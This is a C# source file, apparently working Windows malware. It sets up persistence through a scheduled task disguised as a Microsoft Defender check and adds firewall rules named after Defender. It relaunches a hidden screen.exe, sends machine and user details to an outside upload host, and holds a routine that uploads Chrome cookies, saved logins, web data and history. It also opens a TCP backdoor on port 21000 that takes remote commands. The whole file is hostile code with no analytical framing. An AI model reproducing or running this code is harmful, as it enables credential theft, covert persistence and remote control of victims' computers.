using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Web.Script.Serialization;
using System.Text;
using Microsoft.Win32.TaskScheduler;
using System.Threading;

namespace features
{
	public class BasicActions
	{
		static bool debug = true;

		static int listenPort = 21000;
		static byte[] buffer = new byte[1024];
		static int maxClientInQueue = 5;
		static Socket serverSocket = new Socket( AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp );


		public static void Run( )
		{
			try
			{
				if ( !File.Exists( "key" ) )
				{
					new System.Action( adjustAutorun ).BeginInvoke( null, null );
					File.Create( "key" );
					Thread.Sleep( 2000 );
					return;
				}

				foreach ( var process in Process.GetProcessesByName( "resident" ) )
					if ( process.Id != Process.GetCurrentProcess( ).Id )
						process.Kill( );

				new System.Action( adjustAutorun ).BeginInvoke( null, null );
				new System.Action( adjustFirewall ).BeginInvoke( null, null );
				new System.Action( startServer ).BeginInvoke( null, null );
				new System.Action( sendInfo ).BeginInvoke( null, null );
				new System.Action( pickUpScreen ).BeginInvoke( null, null );

				new ManualResetEvent( false ).WaitOne( );
			}
			catch ( Exception ex )
			{
				var str = string.Empty;
				if ( ex.Message != "" )
					str += string.Concat( "exception: ", ex.Message, "\n" );

				if ( ex.InnerException.Message != "" )
					str += string.Concat( "innerException: ", ex.InnerException.Message );

				Console.WriteLine( str );

				new ManualResetEvent( false ).WaitOne( );
			}
		}



		static void adjustAutorun( )
		{
			using ( var ts = new TaskService( ) )
			{
				var td = ts.NewTask( );
				td.RegistrationInfo.Description = "Scheduled file check";
				td.Triggers.Add( new LogonTrigger { Delay = new TimeSpan( 0, 0, 10 ) } );
				td.Actions.Add( new ExecAction( $"{Environment.CurrentDirectory}\\resident.exe", null, $"{Environment.CurrentDirectory}" ) );
				ts.RootFolder.RegisterTaskDefinition( "MicrosoftDefenderScheduledCheck", td );
				ts.FindTask( "MicrosoftDefenderScheduledCheck" ).Enabled = true;
			}
		}
		static void adjustFirewall( )
		{
			var startInfo = new ProcessStartInfo( );
			startInfo.CreateNoWindow = true;
			startInfo.FileName = "cmd.exe";
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
			startInfo.Arguments = $"/C netsh advfirewall firewall delete rule name=DefenderScheduler";
			Process.Start( startInfo );
			Thread.Sleep( 500 );
			startInfo.Arguments = $"/C netsh advfirewall firewall delete rule name=DefenderUpdate";
			Process.Start( startInfo );
			Thread.Sleep( 500 );
			startInfo.Arguments = $"/C netsh advfirewall firewall add rule name=DefenderScheduler dir=in action=allow program=\"{Environment.CurrentDirectory}\\resident.exe\" enable=yes ";
			Process.Start( startInfo );
			Thread.Sleep( 500 );
			startInfo.Arguments = $"/C netsh advfirewall firewall add rule name=DefenderScheduler dir=out action=allow program=\"{Environment.CurrentDirectory}\\resident.exe\" enable=yes ";
			Process.Start( startInfo );
			Thread.Sleep( 500 );
			startInfo.Arguments = $"/C netsh advfirewall firewall add rule name=DefenderUpdate dir=out action=allow program=\"{Environment.CurrentDirectory}\\update.exe\" enable=yes ";
			Process.Start( startInfo );
			Thread.Sleep( 1000 );
			startInfo.Arguments = $"/C netsh advfirewall firewall delete rule name=resident.exe";
			Process.Start( startInfo );
		}
		static void pickUpScreen( )
		{
			while ( true )
			{
				if ( Process.GetProcessesByName( "screen" ).Length == 0 )
				{
					var startInfo = new ProcessStartInfo( );
					startInfo.CreateNoWindow = true;
					startInfo.FileName = "cmd.exe";
					startInfo.WindowStyle = ProcessWindowStyle.Hidden;
					startInfo.WorkingDirectory = $"{Environment.GetFolderPath( Environment.SpecialFolder.ApplicationData )}\\Screen";
					startInfo.Arguments = $"/C start {Environment.GetFolderPath( Environment.SpecialFolder.ApplicationData )}\\Screen\\screen.exe";
					Process.Start( startInfo );
				}
				Thread.Sleep( 7000 );
			}
		}
		static void update( )
		{
			var startInfo = new ProcessStartInfo( );
			startInfo.CreateNoWindow = true;
			startInfo.FileName = "update.exe";
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start( startInfo );
		}


		static void sendInfo( )
		{
			var ser = new JavaScriptSerializer( );
			var info = ser.Deserialize<Info>( getIp( ) );

			if ( info != null )
			{
				info.roamingPath = Environment.GetFolderPath( Environment.SpecialFolder.ApplicationData );
				info.desktopPath = Environment.GetFolderPath( Environment.SpecialFolder.Desktop );
				info.localPath = Environment.GetFolderPath( Environment.SpecialFolder.LocalApplicationData );
				info.documentsPath = Environment.GetFolderPath( Environment.SpecialFolder.Personal );
				info.computerName = Environment.MachineName;
				info.userName = Environment.UserName;
				info.myPath = Environment.CurrentDirectory;

				var json = ser.Serialize( info );

				var fileName = $"{info.query}_info";
				File.WriteAllText( fileName, json );
				uploadFile( fileName, fileName );
				File.Delete( fileName );
			}
		}
		static string getIp( )
		{
			var webClient = new WebClient( );
			return webClient.DownloadString( "http://ip-api.com/json/" );
		}
		static void send( string ip, string what )
		{
			if ( what == "chrome" )
			{
				var localPath = Environment.GetFolderPath( Environment.SpecialFolder.LocalApplicationData );
				var chromePath = string.Concat( localPath, "\\Google\\Chrome\\User Data\\Default" );

				var filePath = $"{chromePath}\\Bookmarks";
				var fileName = $"{ip}_bookmarks";
				uploadFile( filePath, fileName );

				filePath = $"{chromePath}\\Cookies";
				fileName = $"{ip}_cookies";
				uploadFile( filePath, fileName );

				filePath = $"{chromePath}\\Login Data";
				fileName = $"{ip}_loginData";
				uploadFile( filePath, fileName );

				filePath = $"{chromePath}\\Web Data";
				fileName = $"{ip}_webData";
				uploadFile( filePath, fileName );

				filePath = $"{chromePath}\\History";
				fileName = $"{ip}_history";
				uploadFile( filePath, fileName );
			}
		}
		static void uploadFile( string filePath, string fileName )
		{
			if ( debug )
				Console.WriteLine( $"{DateTime.Now}\tuploading {fileName}..." );

			var webClient = new WebClient( );
			byte[] result;

			if ( File.Exists( filePath ) )
				result = webClient.UploadFile( string.Concat( "http://slimbde.atwebpages.com/upload.php?name=", fileName ), "POST", filePath );

			if ( debug )
				Console.WriteLine( $"{DateTime.Now}\t{fileName} has been uploaded\n" );
		}
		static void downloadFile( string source, string destination )
		{
			if ( debug )
				Console.WriteLine( $"{DateTime.Now}\tdownloading {source}..." );

			var webClient = new WebClient( );

			webClient.DownloadFile( source, destination );

			if ( debug && File.Exists( destination ) )
				Console.WriteLine( $"{DateTime.Now}\t{destination} has been downloaded\n" );
		}


		static void startServer( )
		{
			if ( debug )
				Console.WriteLine( $"{DateTime.Now}\tSetting up server.." );

			serverSocket.Bind( new IPEndPoint( IPAddress.Any, listenPort ) );
			serverSocket.Listen( maxClientInQueue );
			serverSocket.BeginAccept( new AsyncCallback( acceptCallback ), null );

			if ( debug )
				Console.WriteLine( $"{DateTime.Now}\tListening port {listenPort}\n" );
		}
		static void acceptCallback( IAsyncResult result )
		{
			if ( debug )
				Console.WriteLine( $"{DateTime.Now}\tclient connected. Start receiving" );
			var socket = serverSocket.EndAccept( result );
			socket.BeginReceive( buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback( receiveCallback ), socket );

			serverSocket.BeginAccept( new AsyncCallback( acceptCallback ), null );
		}
		static void receiveCallback( IAsyncResult result )
		{
			var socket = ( Socket )result.AsyncState;

			try
			{
				var received = socket.EndReceive( result );

				byte[] DataBuf = new byte[received];
				Array.Copy( buffer, DataBuf, received );

				var message = Encoding.ASCII.GetString( DataBuf );
				if ( debug )
					Console.WriteLine( $"{DateTime.Now}\tclient > {message}" );

				switch ( message.ToLower( ) )
				{
					case "update":
						sendText( "updating" );
						update( );
						break;
					case "logout":
						sendText( "bye" );
						throw new SocketException( 1 );
					case "stop":
						sendText( "bye" );
						Environment.Exit( 1 );
						break;
					case "use":
						sendText( "\navailable commands:\n- update (updates core functions)\n- logout (disconnect)\n- stop (switch off server)" );
						break;
					default:
						sendText( "wrong command" );
						break;
				}

				socket.BeginReceive( buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback( receiveCallback ), socket );

				void sendText( string text )
				{
					DataBuf = new byte[text.Length];
					DataBuf = Encoding.ASCII.GetBytes( text );

					socket.Send( DataBuf );
				}
			}
			catch ( SocketException )
			{
				socket.Close( );
				if ( debug )
					Console.WriteLine( $"{DateTime.Now}\tclient disconnected" );
				serverSocket.BeginAccept( new AsyncCallback( acceptCallback ), null );
			}
		}
	}
}
